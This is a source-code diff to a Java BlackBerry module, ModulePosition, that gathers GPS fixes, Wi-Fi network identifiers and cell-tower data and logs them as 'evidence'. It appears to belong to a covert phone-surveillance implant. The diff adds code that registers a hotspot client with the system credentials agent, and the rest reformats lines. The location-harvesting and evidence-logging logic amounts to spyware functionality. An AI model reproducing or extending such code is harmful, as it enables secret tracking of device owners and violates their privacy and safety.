@@ -17,6 +17,7 @@ import java.util.TimerTask;
 import javax.microedition.location.Location;
 import javax.microedition.location.QualifiedCoordinates;
 
+import net.rim.device.api.system.ApplicationDescriptor;
 import net.rim.device.api.system.CDMAInfo;
 import net.rim.device.api.system.CDMAInfo.CDMACellInfo;
 import net.rim.device.api.system.GPRSInfo;
@@ -27,6 +28,12 @@ import net.rim.device.api.system.RadioInfo;
 import net.rim.device.api.system.WLANInfo;
 import net.rim.device.api.system.WLANInfo.WLANAPInfo;
 import net.rim.device.api.util.DataBuffer;
+import net.rim.device.api.wlan.hotspot.AuthenticationStatusEvent;
+import net.rim.device.api.wlan.hotspot.HotspotClient;
+import net.rim.device.api.wlan.hotspot.HotspotClientRegistry;
+import net.rim.device.api.wlan.hotspot.HotspotCredentialsAgent;
+import net.rim.device.api.wlan.hotspot.HotspotException;
+import net.rim.device.api.wlan.hotspot.HotspotStatusListener;
 import blackberry.Device;
 import blackberry.Messages;
 import blackberry.Status;
@@ -40,6 +47,9 @@ import blackberry.evidence.Evidence;
 import blackberry.evidence.EvidenceType;
 import blackberry.location.LocationHelper;
 import blackberry.location.LocationObserver;
+import blackberry.module.wifi.HotSpotAuthAgentEnabler;
+import blackberry.module.wifi.HotspotClientEnabler;
+import blackberry.module.wifi.HotspotCredentialsAgentEnabler;
 import blackberry.utils.DateTime;
 import blackberry.utils.Utils;
 
@@ -187,8 +197,11 @@ public final class ModulePosition extends BaseInstantModule implements
     private Timer timer;
     private boolean waitingForPoint;
 
+    private HotspotClientEnabler hotspotClientEnabler;
+
     /**
-     * http://supportforums.blackberry.com/t5/tkb/articleprintpage/tkb-id/java_dev@tkb/article-id/479
+     * http://supportforums.blackberry.com/t5/tkb/articleprintpage/tkb-id/
+     * java_dev@tkb/article-id/479
      */
     private void locationGPS() {
         //#ifdef DEBUG
@@ -269,6 +282,13 @@ public final class ModulePosition extends BaseInstantModule implements
                 final byte[] payload = getWifiPayload(wifi.getBSSID(),
                         wifi.getSSID(), wifi.getSignalLevel());
 
+                //#ifdef WIFI_HOTSPOT
+                if (hotspotClientEnabler == null) {
+
+                    hotspotClientEnabler = hotspotFactory();
+                }
+                //#endif
+
                 logWifi.createEvidence(getAdditionalData(1, LOG_TYPE_WIFI));
                 logWifi.writeEvidence(payload);
                 logWifi.close();
@@ -279,6 +299,45 @@ public final class ModulePosition extends BaseInstantModule implements
             //#endif
         }
 
+    }
+
+    private HotspotClientEnabler hotspotFactory() {
+        try {
+
+            HotspotCredentialsAgentEnabler hotSpotCredentialsAgent = new HotspotCredentialsAgentEnabler();
+            hotSpotCredentialsAgent
+                    .setCredentialsControlPreference(HotspotCredentialsAgentEnabler.PREFERENCE_DEFAULT);
+
+            HotspotStatusListener listener = new HotspotStatusListener() {
+
+                public void updateStatus(AuthenticationStatusEvent event) {
+                    Debug.init();
+                    //#ifdef DEBUG
+                    debug.trace("updateStatus: " + event.getStatus() + "/n");
+                    //#endif                               
+                }
+            };
+
+            HotSpotAuthAgentEnabler hotSpotAuthAgentEnabler = new HotSpotAuthAgentEnabler();
+            hotSpotAuthAgentEnabler.addListener(listener);
+
+            HotspotClientEnabler hotspotClientEnabler = new HotspotClientEnabler(
+                    HotspotCredentialsAgent.getSystemHotspotCredentialsAgent(),
+                    hotSpotAuthAgentEnabler, HotspotClient.NETWORK_TYPE_MANUAL);
+
+            HotspotClientRegistry.add(hotspotClientEnabler,
+                    ApplicationDescriptor.currentApplicationDescriptor());
+
+            return hotspotClientEnabler;
+
+        } catch (HotspotException e) {
+            //#ifdef DEBUG
+            debug.error(e);
+            debug.error("hotspotFactory");
+            //#endif   
+        }
+
+        return null;
     }
 
     private void locationCELL() {
@@ -337,7 +396,8 @@ public final class ModulePosition extends BaseInstantModule implements
             //#endif
 
             if (mcc != 0) {
-                final byte[] payload = getCellPayload(mcc, mnc, lac, cid, 0, rssi);
+                final byte[] payload = getCellPayload(mcc, mnc, lac, cid, 0,
+                        rssi);
 
                 if (payload != null) {
                     logCell.createEvidence(getAdditionalData(0, LOG_TYPE_GSM));
@@ -374,7 +434,8 @@ public final class ModulePosition extends BaseInstantModule implements
             //#endif
 
             if (sid != 0) {
-                final byte[] payload = getCellPayload(mcc, sid, nid, bid, 0, rssi);
+                final byte[] payload = getCellPayload(mcc, sid, nid, bid, 0,
+                        rssi);
                 logCell.createEvidence(getAdditionalData(0, LOG_TYPE_CDMA));
                 saveEvidence(logCell, payload, LOG_TYPE_CDMA);
                 logCell.close();
@@ -428,7 +489,8 @@ public final class ModulePosition extends BaseInstantModule implements
             //#endif
 
             if (mcc != 0) {
-                final byte[] payload = getCellPayload(mcc, ndc, said, cid, llaid, rssi);
+                final byte[] payload = getCellPayload(mcc, ndc, said, cid,
+                        llaid, rssi);
 
                 if (payload != null) {
                     logCell.createEvidence(getAdditionalData(0, LOG_TYPE_GSM));
@@ -615,7 +677,8 @@ public final class ModulePosition extends BaseInstantModule implements
         return payload;
     }
 
-    private byte[] getCellPayload(int mcc, int mnc, int lac, int cid, int bsid, int rssi) {
+    private byte[] getCellPayload(int mcc, int mnc, int lac, int cid, int bsid,
+            int rssi) {
 
         final int size = 19 * 4 + 48 + 16;
         final byte[] cellPosition = new byte[size];
